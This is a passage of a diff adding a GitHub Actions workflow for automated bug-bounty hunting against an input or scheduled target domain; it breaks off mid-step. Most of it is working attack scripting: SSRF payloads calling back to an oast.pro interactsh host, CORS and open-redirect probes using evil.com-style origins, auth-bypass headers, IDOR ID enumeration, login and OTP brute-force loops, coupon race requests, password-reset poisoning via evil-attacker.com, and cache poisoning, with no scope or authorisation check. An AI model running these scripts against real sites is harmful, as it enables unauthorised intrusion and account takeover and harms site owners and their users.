@@ -1,0 +1,1935 @@
+name: "💎 ULTRA Hunter — Full Bug Bounty Methodology"
+
+# ══════════════════════════════════════════════════════════════════
+# Based on:
+# - HackerOne top disclosed reports (IDOR, ATO, Logic, SSRF, XSS)
+# - nahamsec / tomnomnom / hakluke / zseano / albinowax techniques
+# - Reddit r/bugbounty + Medium writeups + Twitter tips
+# - ProjectDiscovery research + PortSwigger Web Security Academy
+# ══════════════════════════════════════════════════════════════════
+
+on:
+  workflow_dispatch:
+    inputs:
+      domain:
+        description: "Target domain (e.g. example.com)"
+        required: true
+      mode:
+        description: "full / quick / auth / api"
+        default: "full"
+  schedule:
+    - cron: "0 4 * * 6"   # كل سبت 4 الصبح
+
+jobs:
+  ultra:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    permissions:
+      contents: write
+
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: "1.22"
+
+      # ════════════════════════════════════════════════════════════
+      # INSTALL — كل الأدوات
+      # ════════════════════════════════════════════════════════════
+      - name: "⚙️ Install All Tools"
+        run: |
+          export GOPATH=$HOME/go
+          export PATH=$PATH:$HOME/go/bin
+
+          # ── ProjectDiscovery ───────────────────────────────────
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          go install github.com/projectdiscovery/katana/cmd/katana@latest
+          go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+          go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+          go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+
+          # ── tomnomnom toolkit ─────────────────────────────────
+          go install github.com/tomnomnom/gf@latest
+          go install github.com/tomnomnom/anew@latest
+          go install github.com/tomnomnom/qsreplace@latest
+          go install github.com/tomnomnom/unfurl@latest
+          go install github.com/tomnomnom/waybackurls@latest
+
+          # ── URL collection ────────────────────────────────────
+          go install github.com/lc/gau/v2/cmd/gau@latest
+
+          # ── Fuzzing ───────────────────────────────────────────
+          go install github.com/ffuf/ffuf/v2@main
+
+          # ── XSS ──────────────────────────────────────────────
+          go install github.com/hahwul/dalfox/v2@latest
+
+          # ── Secrets ──────────────────────────────────────────
+          go install github.com/gitleaks/gitleaks/v8@latest
+
+          # ── Takeover ─────────────────────────────────────────
+          go install github.com/PentestPad/subzy@latest
+
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+
+          # ── GF patterns (tomnomnom + 1ndianl33t) ─────────────
+          mkdir -p ~/.gf
+          git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns /tmp/gfp 2>/dev/null || true
+          git clone --depth 1 https://github.com/tomnomnom/gf /tmp/gf-repo 2>/dev/null || true
+          cp /tmp/gfp/*.json ~/.gf/ 2>/dev/null || true
+          cp /tmp/gf-repo/examples/*.json ~/.gf/ 2>/dev/null || true
+
+          # ── Nuclei templates ──────────────────────────────────
+          nuclei -update-templates -silent 2>/dev/null || true
+
+          # ── Python tools ──────────────────────────────────────
+          sudo apt-get update -qq && sudo apt-get install -y -qq jq 2>/dev/null || true
+          pip install uro pyjwt requests --quiet 2>/dev/null || true
+
+          # ── Wordlists ─────────────────────────────────────────
+          wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt" \
+            -O /tmp/common.txt || true
+          wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-small-files.txt" \
+            -O /tmp/files.txt || true
+
+      # ════════════════════════════════════════════════════════════
+      # SETUP
+      # ════════════════════════════════════════════════════════════
+      - name: "🎯 Setup"
+        run: |
+          D="${{ github.event.inputs.domain || secrets.TARGET_DOMAIN }}"
+          MODE="${{ github.event.inputs.mode || 'full' }}"
+          echo "DOMAIN=$D"   >> $GITHUB_ENV
+          echo "MODE=$MODE"  >> $GITHUB_ENV
+          mkdir -p /tmp/ultra/$D/{urls,auth,idor,logic,blind,gf,nuclei,xss,jwt,graphql,cache,ssti,files,headers,race,oauth,mass}
+          echo "[*] Target: $D | Mode: $MODE | $(date -u)"
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 1 — URL Collection (from previous scans or fresh)
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣ URL Collection"
+        run: |
+          D=${{ env.DOMAIN }}
+
+          if [ -f "results/$D/all_urls.txt" ] && [ -s "results/$D/all_urls.txt" ]; then
+            echo "[+] Using saved results"
+            cp "results/$D/all_urls.txt"  /tmp/ultra/$D/urls/all_urls.txt
+            awk '{print $1}' "results/$D/live_hosts.txt" 2>/dev/null | \
+              sort -u > /tmp/ultra/$D/urls/live_urls.txt || true
+          else
+            echo "[*] Fresh recon"
+            subfinder -d $D -all -silent 2>/dev/null | \
+              httpx -silent -threads 80 -status-code -title -tech-detect | \
+              tee /tmp/ultra/$D/urls/live_full.txt | \
+              awk '{print $1}' > /tmp/ultra/$D/urls/live_urls.txt || true
+
+            # Historical URLs — nahamsec technique
+            gau --threads 5 --subs $D 2>/dev/null | \
+              grep -vE "\.(png|jpg|gif|css|woff|eot|ico|mp4|webp|svg)(\?|$)" \
+              > /tmp/ultra/$D/urls/gau.txt || true
+            echo $D | waybackurls 2>/dev/null \
+              >> /tmp/ultra/$D/urls/gau.txt || true
+
+            # Active crawl with JS execution
+            cat /tmp/ultra/$D/urls/live_urls.txt | katana \
+              -d 3 -jc -jsl -kf all -aff \
+              -silent -c 25 -timeout 15 \
+              -o /tmp/ultra/$D/urls/katana.txt 2>/dev/null || true
+
+            cat /tmp/ultra/$D/urls/katana.txt \
+                /tmp/ultra/$D/urls/gau.txt 2>/dev/null | \
+              sort -u | uro > /tmp/ultra/$D/urls/all_urls.txt 2>/dev/null || \
+              sort -u /tmp/ultra/$D/urls/katana.txt \
+                      /tmp/ultra/$D/urls/gau.txt \
+              > /tmp/ultra/$D/urls/all_urls.txt 2>/dev/null || true
+          fi
+
+          touch /tmp/ultra/$D/urls/all_urls.txt \
+                /tmp/ultra/$D/urls/live_urls.txt
+
+          echo "LIVE=$(wc -l < /tmp/ultra/$D/urls/live_urls.txt 2>/dev/null || echo 0)"   >> $GITHUB_ENV
+          echo "TOTAL=$(wc -l < /tmp/ultra/$D/urls/all_urls.txt 2>/dev/null || echo 0)"   >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 2 — GF Pattern Mining (tomnomnom technique)
+      # ════════════════════════════════════════════════════════════
+      - name: "2️⃣ GF Pattern Mining"
+        run: |
+          D=${{ env.DOMAIN }}
+          URLS=/tmp/ultra/$D/urls/all_urls.txt
+
+          # Core patterns
+          for P in ssrf xss sqli lfi redirect rce idor debug ssti; do
+            gf $P $URLS > /tmp/ultra/$D/gf/$P.txt 2>/dev/null || \
+              touch /tmp/ultra/$D/gf/$P.txt
+          done
+
+          # IDOR params — from top HackerOne reports
+          grep -iE "\?(.*&)?(id|uid|user_id|userid|account_id|order_id|invoice_id|ticket|ref|uuid|doc_id|file_id|item_id|payment_id|customer_id|profile_id|post_id|comment_id|message_id)=" \
+            $URLS | sort -u > /tmp/ultra/$D/gf/idor_params.txt || true
+
+          # Auth endpoints — ATO vector
+          grep -iE "(login|signin|sign.in|auth|oauth|token|session|logout|register|signup|reset|forgot|password|verify|confirm|2fa|mfa|otp|callback|sso|saml)" \
+            $URLS | sort -u > /tmp/ultra/$D/auth/auth_urls.txt || true
+
+          # Admin / internal (very high value)
+          grep -iE "(admin|dashboard|internal|management|console|portal|staff|superuser|backoffice|control.panel|cp|moderator|operator)" \
+            $URLS | sort -u > /tmp/ultra/$D/auth/admin_urls.txt || true
+
+          # API endpoints — versioned (common bypass target)
+          grep -iE "(/api/|/v[0-9]+[./]|/rest/|/graphql|/gql|/rpc)" \
+            $URLS | sort -u > /tmp/ultra/$D/auth/api_urls.txt || true
+
+          # File upload targets
+          grep -iE "(upload|file|attachment|import|media|image|avatar|document|export|download)" \
+            $URLS | sort -u > /tmp/ultra/$D/logic/upload_urls.txt || true
+
+          # Price / checkout / payment (business logic)
+          grep -iE "(price|amount|total|quantity|qty|discount|coupon|promo|checkout|cart|pay|purchase|order|refund|credit|balance)" \
+            $URLS | sort -u > /tmp/ultra/$D/logic/payment_urls.txt || true
+
+          # JWT endpoints
+          grep -iE "(jwt|bearer|token|access_token|refresh_token|id_token)" \
+            $URLS | sort -u > /tmp/ultra/$D/jwt/jwt_urls.txt || true
+
+          # GraphQL
+          grep -iE "(graphql|gql|__schema|__type|query|mutation|subscription)" \
+            $URLS | sort -u > /tmp/ultra/$D/graphql/gql_urls.txt || true
+
+          # OAuth / SSO
+          grep -iE "(oauth|sso|saml|openid|authorize|code=|state=|redirect_uri|client_id)" \
+            $URLS | sort -u > /tmp/ultra/$D/oauth/oauth_urls.txt || true
+
+          # Report counts
+          for F in ssrf xss sqli lfi redirect rce idor debug ssti idor_params auth_urls admin_urls api_urls upload_urls payment_urls; do
+            SRC="/tmp/ultra/$D/gf/$F.txt"
+            [ -f "/tmp/ultra/$D/auth/$F.txt" ] && SRC="/tmp/ultra/$D/auth/$F.txt"
+            [ -f "/tmp/ultra/$D/logic/$F.txt" ] && SRC="/tmp/ultra/$D/logic/$F.txt"
+            echo "GF_${F^^}=$(wc -l < $SRC 2>/dev/null || echo 0)" >> $GITHUB_ENV
+          done
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 3 — Nuclei Full Scan
+      # ════════════════════════════════════════════════════════════
+      - name: "3️⃣ Nuclei — Full Template Scan"
+        run: |
+          D=${{ env.DOMAIN }}
+
+          # Main scan on live hosts
+          nuclei \
+            -list /tmp/ultra/$D/urls/live_urls.txt \
+            -t cves/ -t vulnerabilities/ -t exposures/ \
+            -t misconfiguration/ -t default-logins/ \
+            -t takeovers/ -t file/ \
+            -tags auth,session,login,oauth,bypass,jwt,csrf,cors,default-login,config,exposure \
+            -severity critical,high,medium \
+            -silent -json \
+            -o /tmp/ultra/$D/nuclei/main.json \
+            -c 40 -timeout 10 -rl 150 -retries 1 2>/dev/null || true
+
+          # Admin endpoints scan
+          if [ -s /tmp/ultra/$D/auth/admin_urls.txt ]; then
+            nuclei \
+              -list /tmp/ultra/$D/auth/admin_urls.txt \
+              -t misconfiguration/ -t exposures/ -t default-logins/ -t cves/ \
+              -severity critical,high,medium \
+              -silent -json \
+              -o /tmp/ultra/$D/nuclei/admin.json \
+              -c 20 -timeout 10 2>/dev/null || true
+          fi
+
+          # API endpoints scan
+          if [ -s /tmp/ultra/$D/auth/api_urls.txt ]; then
+            nuclei \
+              -list /tmp/ultra/$D/auth/api_urls.txt \
+              -t exposures/ -t misconfiguration/ -t vulnerabilities/ \
+              -severity critical,high,medium \
+              -silent -json \
+              -o /tmp/ultra/$D/nuclei/api.json \
+              -c 20 -timeout 10 2>/dev/null || true
+          fi
+
+          # Merge all results
+          cat /tmp/ultra/$D/nuclei/main.json \
+              /tmp/ultra/$D/nuclei/admin.json \
+              /tmp/ultra/$D/nuclei/api.json 2>/dev/null | \
+            sort -u > /tmp/ultra/$D/nuclei/all.json
+
+          # Count by severity using grep
+          for S in critical high medium low; do
+            N=$(grep -c "\"severity\":\"$S\"" \
+              /tmp/ultra/$D/nuclei/all.json 2>/dev/null || echo 0)
+            echo "NUCLEI_${S^^}=$N" >> $GITHUB_ENV
+          done
+          echo "NUCLEI_TOTAL=$(wc -l < /tmp/ultra/$D/nuclei/all.json 2>/dev/null || echo 0)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 4 — XSS (Dalfox — top technique from @hahwul)
+      # ════════════════════════════════════════════════════════════
+      - name: "4️⃣ XSS — Dalfox"
+        run: |
+          D=${{ env.DOMAIN }}
+          touch /tmp/ultra/$D/xss/results.txt
+          if [ -s /tmp/ultra/$D/gf/xss.txt ]; then
+            head -100 /tmp/ultra/$D/gf/xss.txt | dalfox pipe \
+              --silence --only-poc \
+              --output /tmp/ultra/$D/xss/results.txt \
+              --timeout 10 --worker 30 2>/dev/null || true
+          fi
+          echo "XSS_COUNT=$(wc -l < /tmp/ultra/$D/xss/results.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 5 — Open Redirect (common chain with OAuth)
+      # ════════════════════════════════════════════════════════════
+      - name: "5️⃣ Open Redirect"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/logic/redirects.txt
+          if [ -s /tmp/ultra/$D/gf/redirect.txt ]; then
+            head -80 /tmp/ultra/$D/gf/redirect.txt | \
+              qsreplace "https://evil-redir.com" | \
+              while read URL; do
+                FINAL=$(curl -sk -L -o /dev/null \
+                  -w '%{url_effective}' "$URL" --max-time 8 2>/dev/null)
+                echo "$FINAL" | grep -q "evil-redir.com" && \
+                  echo "[REDIRECT] $URL => $FINAL" >> /tmp/ultra/$D/logic/redirects.txt
+              done
+          fi
+          echo "REDIR_COUNT=$(wc -l < /tmp/ultra/$D/logic/redirects.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 6 — CORS (Origin reflection = ATO chain)
+      # ════════════════════════════════════════════════════════════
+      - name: "6️⃣ CORS Misconfiguration"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/logic/cors.txt
+          head -30 /tmp/ultra/$D/urls/live_urls.txt | while read URL; do
+            for ORIGIN in "https://evil.com" "https://evil-$D.com" \
+                          "null" "https://$D.evil.com" \
+                          "https://not${D}" "https://${D}x.com"; do
+              RESP=$(curl -sk -H "Origin: $ORIGIN" \
+                -H "Access-Control-Request-Method: GET" \
+                -I "$URL" --max-time 8 2>/dev/null)
+              ACAO=$(echo "$RESP" | grep -i "access-control-allow-origin" | tr -d '\r')
+              ACAC=$(echo "$RESP" | grep -i "access-control-allow-credentials" | tr -d '\r')
+              if echo "$ACAO" | grep -qiE "evil|null|$D.evil|not$D|${D}x"; then
+                echo "[CORS VULN] $URL | $ACAO | Creds: $ACAC" >> /tmp/ultra/$D/logic/cors.txt
+              fi
+            done
+          done
+          echo "CORS_COUNT=$(wc -l < /tmp/ultra/$D/logic/cors.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 7 — Auth Bypass (from top HackerOne reports)
+      # ════════════════════════════════════════════════════════════
+      - name: "7️⃣ Auth Bypass — Headers + Path + Method"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/auth/bypass.txt
+
+          # ── Header injection bypass ────────────────────────────
+          HDRS=("X-Original-URL: /admin" "X-Rewrite-URL: /admin"
+                "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1"
+                "X-Custom-IP-Authorization: 127.0.0.1"
+                "X-Forwarded-Host: localhost" "X-Host: localhost"
+                "Forwarded: for=127.0.0.1;host=localhost"
+                "X-Remote-IP: 127.0.0.1" "X-Client-IP: 127.0.0.1"
+                "True-Client-Ip: 127.0.0.1")
+
+          head -15 /tmp/ultra/$D/urls/live_urls.txt | while read HOST; do
+            for H in "${HDRS[@]}"; do
+              S=$(curl -sk -H "$H" -o /dev/null -w "%{http_code}" \
+                "$HOST/admin" --max-time 8 2>/dev/null)
+              echo "200 201 302" | grep -qw "$S" && \
+                echo "[HEADER BYPASS] $HOST | $H -> $S" >> /tmp/ultra/$D/auth/bypass.txt
+            done
+          done
+
+          # ── Path traversal bypass ─────────────────────────────
+          head -20 /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | while read URL; do
+            BASE=$(echo $URL | grep -oE "https?://[^/]+")
+            for P in "//admin" "/%2fadmin" "/./admin" "/admin%20" \
+                     "/admin.json" "/admin%00" "/.admin" \
+                     "/ADMIN" "/Admin" "/admin~" "/admin.php"; do
+              S=$(curl -sk -o /dev/null -w "%{http_code}" \
+                "${BASE}${P}" --max-time 8 2>/dev/null)
+              echo "200 201" | grep -qw "$S" && \
+                echo "[PATH BYPASS] ${BASE}${P} -> $S" >> /tmp/ultra/$D/auth/bypass.txt
+            done
+          done
+
+          # ── HTTP Method bypass ────────────────────────────────
+          head -15 /tmp/ultra/$D/auth/admin_urls.txt 2>/dev/null | while read URL; do
+            for METHOD in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
+              S=$(curl -sk -X $METHOD -o /dev/null -w "%{http_code}" \
+                "$URL" --max-time 8 2>/dev/null)
+              echo "200 201" | grep -qw "$S" && \
+                echo "[METHOD $METHOD] $URL -> $S" >> /tmp/ultra/$D/auth/bypass.txt
+            done
+          done
+
+          # ── API version bypass (v1 instead of v2) ─────────────
+          head -30 /tmp/ultra/$D/auth/api_urls.txt 2>/dev/null | while read URL; do
+            for V in v1 v2 v3 v0 v1.0 v2.0 v1beta v2beta; do
+              ALT=$(echo $URL | sed "s|/v[0-9][0-9.a-z]*|/$V|g")
+              [ "$ALT" = "$URL" ] && continue
+              S=$(curl -sk -o /dev/null -w "%{http_code}" "$ALT" --max-time 8)
+              echo "200 201" | grep -qw "$S" && \
+                echo "[VERSION BYPASS] $ALT ($S)" >> /tmp/ultra/$D/auth/bypass.txt
+            done
+          done
+
+          echo "BYPASS_COUNT=$(wc -l < /tmp/ultra/$D/auth/bypass.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 8 — IDOR Detection (most common HackerOne bug)
+      # ════════════════════════════════════════════════════════════
+      - name: "8️⃣ IDOR Detection"
+        run: |
+          D=${{ env.DOMAIN }}
+          export DOMAIN="$D"
+          > /tmp/ultra/$D/idor/findings.txt
+
+          cat > /tmp/idor_check.py << 'SCRIPT_END'
+import subprocess, re, os, time
+
+domain = os.environ.get("DOMAIN","")
+findings = open(f'/tmp/ultra/{domain}/idor/findings.txt', 'w')
+
+def req(url):
+    try:
+        r = subprocess.run(
+            ['curl','-sk','-o','/dev/null','-w','%{http_code}\t%{size_download}',
+             url,'--max-time','8'],
+            capture_output=True, text=True, timeout=12
+        ).stdout.strip().split('\t')
+        return (r[0] if r else '0'), (r[1] if len(r)>1 else '0')
+    except:
+        return '0', '0'
+
+try:
+    with open(f'/tmp/ultra/{domain}/gf/idor_params.txt') as f:
+        urls = [l.strip() for l in f if l.strip()][:60]
+except:
+    urls = []
+
+for url in urls:
+    mod1 = re.sub(r'(=|/)([0-9]+)(&|/|$)',
+        lambda m: m.group(1)+str(int(m.group(2))+1)+m.group(3), url)
+    mod3 = re.sub(r'(=|/)([0-9]+)(&|/|$)',
+        lambda m: m.group(1)+'0'+m.group(3), url)
+    if mod1 == url: continue
+    s0,sz0 = req(url)
+    time.sleep(0.2)
+    s1,sz1 = req(mod1)
+    if s0 in ('200','201') and s1 in ('200','201'):
+        findings.write(f'[IDOR?] {url} ({s0},{sz0}B) -> {mod1} ({s1},{sz1}B)\n')
+    if s0=='403' and s1 in ('200','201'):
+        findings.write(f'[IDOR BYPASS!] {url}(403) -> {mod1}({s1})\n')
+    if s0==s1=='200' and abs(int(sz0)-int(sz1))>200:
+        findings.write(f'[IDOR SIZE DIFF] {url}({sz0}B) vs {mod1}({sz1}B)\n')
+    if s0!='200' and mod3!=url:
+        s3,_=req(mod3)
+        if s3 in ('200','201'):
+            findings.write(f'[IDOR ID=0] {url} -> id=0 returned {s3}\n')
+
+findings.close()
+SCRIPT_END
+          python3 /tmp/idor_check.py
+
+          echo "IDOR_COUNT=$(wc -l < /tmp/ultra/$D/idor/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 9 — Blind SSRF via Interactsh
+      # ════════════════════════════════════════════════════════════
+      - name: "9️⃣ Blind SSRF — Interactsh"
+        run: |
+          D=${{ env.DOMAIN }}
+          mkdir -p /tmp/ultra/$D/blind
+          > /tmp/ultra/$D/blind/ssrf.txt
+
+          interactsh-client -server oast.pro -n 1 \
+            -o /tmp/interact_log.txt > /dev/null 2>&1 &
+          sleep 6
+
+          IHOST=$(grep -oE "[a-z0-9]+\.oast\.pro" /tmp/interact_log.txt | head -1)
+          [ -z "$IHOST" ] && IHOST="probe-$(date +%s).oast.pro"
+          echo "[*] Interactsh host: $IHOST"
+
+          # SSRF via GF params
+          if [ -s /tmp/ultra/$D/gf/ssrf.txt ]; then
+            head -50 /tmp/ultra/$D/gf/ssrf.txt | \
+              qsreplace "http://$IHOST" | \
+              while read URL; do
+                curl -sk "$URL" --max-time 8 -o /dev/null 2>/dev/null || true
+              done
+          fi
+
+          # SSRF via headers (from top reports: Referer, X-Forwarded-For)
+          head -15 /tmp/ultra/$D/urls/live_urls.txt | while read HOST; do
+            for HDR in "X-Forwarded-For" "Referer" "X-Real-IP" \
+                       "True-Client-IP" "CF-Connecting-IP" \
+                       "X-Forwarded-Host" "X-Api-Callback" \
+                       "X-Webhook-Url" "Destination"; do
+              curl -sk -H "$HDR: http://$IHOST" \
+                "$HOST" --max-time 8 -o /dev/null 2>/dev/null || true
+            done
+          done
+
+          # SSRF via file upload SVG (common technique)
+          SVG_PAYLOAD="<svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"http://$IHOST/ssrf-svg\"/></svg>"
+          if [ -s /tmp/ultra/$D/logic/upload_urls.txt ]; then
+            head -5 /tmp/ultra/$D/logic/upload_urls.txt | while read UPLOAD_URL; do
+              echo "$SVG_PAYLOAD" | curl -sk -X POST "$UPLOAD_URL" \
+                -F "file=@-;filename=test.svg;type=image/svg+xml" \
+                --max-time 10 -o /dev/null 2>/dev/null || true
+            done
+          fi
+
+          sleep 20
+
+          [ -s /tmp/interact_log.txt ] && \
+            grep -v "^$\|Starting\|Listing\|Waiting\|Interactsh" \
+            /tmp/interact_log.txt > /tmp/ultra/$D/blind/ssrf.txt 2>/dev/null || true
+
+          echo "BLIND_COUNT=$(wc -l < /tmp/ultra/$D/blind/ssrf.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 10 — Rate Limit + Account Enumeration
+      # ════════════════════════════════════════════════════════════
+      - name: "🔟 Rate Limit + Account Enumeration"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/logic/rate_limit.txt
+
+          # ── Login rate limit ──────────────────────────────────
+          grep -iE "(login|signin|auth)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -5 | \
+          while read EP; do
+            CODES=$(for i in $(seq 1 25); do
+              curl -sk -X POST "$EP" \
+                -d "username=test@test.com&password=wrongpass123" \
+                -H "Content-Type: application/x-www-form-urlencoded" \
+                -o /dev/null -w "%{http_code}" --max-time 5 2>/dev/null
+            done | sort | uniq -c)
+            echo "$CODES" | grep -qE "429|503|blocked|locked" || \
+              echo "[NO RATE LIMIT] $EP | $CODES" >> /tmp/ultra/$D/logic/rate_limit.txt
+          done
+
+          # ── OTP/2FA brute possibility ─────────────────────────
+          grep -iE "(otp|verify|confirm|code|2fa|mfa)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -3 | \
+          while read EP; do
+            CODES=$(for i in $(seq 1 20); do
+              curl -sk -X POST "$EP" \
+                -d "otp=111111&code=111111&token=111111" \
+                -o /dev/null -w "%{http_code}" --max-time 5 2>/dev/null
+            done | sort | uniq -c)
+            echo "$CODES" | grep -qE "429|503" || \
+              echo "[OTP BRUTE POSSIBLE] $EP" >> /tmp/ultra/$D/logic/rate_limit.txt
+          done
+
+          # ── Account enumeration (timing + response diff) ──────
+          > /tmp/ultra/$D/auth/enum.txt
+          LOGIN_EP=$(grep -iE "(login|signin)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -1)
+
+          if [ -n "$LOGIN_EP" ]; then
+            T_VALID=$(TIMEFORMAT='%R'; { time curl -sk -X POST "$LOGIN_EP" \
+              -d "username=admin@$D&password=wrongpass" \
+              -o /dev/null --max-time 8 2>/dev/null; } 2>&1)
+            T_INVALID=$(TIMEFORMAT='%R'; { time curl -sk -X POST "$LOGIN_EP" \
+              -d "username=notexist_xyz_123@$D&password=wrongpass" \
+              -o /dev/null --max-time 8 2>/dev/null; } 2>&1)
+
+            python3 -c "
+t1='${T_VALID}'.replace(',','.')
+t2='${T_INVALID}'.replace(',','.')
+try:
+    diff=abs(float(t1)-float(t2))
+    if diff > 0.5:
+        print(f'[TIMING ENUM] ${LOGIN_EP} | valid:{t1}s invalid:{t2}s diff:{diff:.2f}s')
+except: pass
+" >> /tmp/ultra/$D/auth/enum.txt 2>/dev/null || true
+          fi
+
+          echo "RATE_COUNT=$(wc -l < /tmp/ultra/$D/logic/rate_limit.txt)" >> $GITHUB_ENV
+          echo "ENUM_COUNT=$(wc -l < /tmp/ultra/$D/auth/enum.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 11 — Race Condition (top HackerOne technique)
+      # Double-spend, coupon reuse, concurrent requests
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣1️⃣ Race Condition Test"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/race/findings.txt
+
+          # Detect race-prone endpoints
+          RACE_TARGETS=$(cat /tmp/ultra/$D/logic/payment_urls.txt \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | \
+            grep -iE "(coupon|promo|redeem|use|apply|checkout|purchase|transfer|withdraw|vote|like|claim|activate)" | \
+            head -10 || true)
+
+          for EP in $RACE_TARGETS; do
+            # Send 15 parallel requests
+            RESULTS=$(for i in $(seq 1 15); do
+              curl -sk -X POST "$EP" \
+                -H "Content-Type: application/json" \
+                -d '{"coupon":"SAVE50","code":"TEST10"}' \
+                -o /dev/null -w "%{http_code}" \
+                --max-time 10 2>/dev/null &
+            done | wait && cat /tmp/race_tmp.txt 2>/dev/null || true)
+
+            # If multiple 200s = race condition possible
+            SUCCESSES=$(echo "$RESULTS" | grep -c "200\|201" || echo 0)
+            [ "$SUCCESSES" -gt 3 ] && \
+              echo "[RACE CONDITION?] $EP | $SUCCESSES/15 succeeded" \
+              >> /tmp/ultra/$D/race/findings.txt
+          done
+
+          echo "RACE_COUNT=$(wc -l < /tmp/ultra/$D/race/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 12 — Host Header Injection + Password Reset Poisoning
+      # albinowax technique — very high ATO potential
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣2️⃣ Host Header Injection + Reset Poisoning"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/auth/host_header.txt
+
+          EVIL="evil-attacker.com"
+
+          # ── Host header injection ──────────────────────────────
+          head -20 /tmp/ultra/$D/urls/live_urls.txt | while read URL; do
+            for HDR_NAME in "Host" "X-Forwarded-Host" "X-Host" \
+                            "X-Forwarded-Server" "X-HTTP-Host-Override" \
+                            "Forwarded"; do
+              RESP=$(curl -sk -H "$HDR_NAME: $EVIL" \
+                "$URL" --max-time 8 -D - 2>/dev/null | head -30)
+              if echo "$RESP" | grep -q "$EVIL"; then
+                echo "[HOST INJECT] $URL | $HDR_NAME: $EVIL REFLECTED" \
+                  >> /tmp/ultra/$D/auth/host_header.txt
+              fi
+            done
+          done
+
+          # ── Password reset poisoning ───────────────────────────
+          RESET_EP=$(grep -iE "(reset|forgot)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -3)
+
+          for EP in $RESET_EP; do
+            # Test if reset link uses Host header
+            RESP=$(curl -sk -X POST "$EP" \
+              -H "Host: $EVIL" \
+              -H "X-Forwarded-Host: $EVIL" \
+              -d "email=victim@$D" \
+              --max-time 10 2>/dev/null)
+            if echo "$RESP" | grep -qi "$EVIL\|success\|sent\|check"; then
+              echo "[RESET POISON?] $EP | Host: $EVIL sent in reset" \
+                >> /tmp/ultra/$D/auth/host_header.txt
+            fi
+          done
+
+          echo "HOSTHDR_COUNT=$(wc -l < /tmp/ultra/$D/auth/host_header.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 13 — Cache Poisoning + Web Cache Deception
+      # James Kettle technique (PortSwigger research)
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣3️⃣ Cache Poisoning + Web Cache Deception"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/cache/findings.txt
+          mkdir -p /tmp/ultra/$D/cache
+
+          CANARY="cache-test-$(date +%s)"
+
+          # ── Cache Poisoning via unkeyed headers ───────────────
+          head -15 /tmp/ultra/$D/urls/live_urls.txt | while read URL; do
+            for HDR in "X-Forwarded-Host: $CANARY.evil.com" \
+                       "X-Forwarded-Scheme: nothttps" \
+                       "X-Forwarded-Proto: http" \
+                       "X-Original-Url: /$CANARY" \
+                       "X-Rewrite-Url: /$CANARY"; do
+              RESP=$(curl -sk -H "$HDR" "$URL" --max-time 8 2>/dev/null)
+              if echo "$RESP" | grep -q "$CANARY"; then
+                echo "[CACHE POISON] $URL | $HDR REFLECTED" \
+                  >> /tmp/ultra/$D/cache/findings.txt
+              fi
+            done
+          done
+
+          # ── Web Cache Deception (append .css/.js to private URLs) ─
+          AUTH_PATHS=$(cat /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | \
+            grep -iE "(profile|account|dashboard|settings|me|user)" | head -10)
+
+          for URL in $AUTH_PATHS; do
+            for EXT in ".css" ".js" ".png" ".jpg" "/style.css" "/app.js"; do
+              RESP1=$(curl -sk "$URL" -o /dev/null -w "%{http_code}" --max-time 8)
+              RESP2=$(curl -sk "${URL}${EXT}" -o /dev/null -w "%{http_code}" --max-time 8)
+              if [ "$RESP1" = "200" ] && [ "$RESP2" = "200" ]; then
+                echo "[CACHE DECEPTION?] ${URL}${EXT} returns 200" \
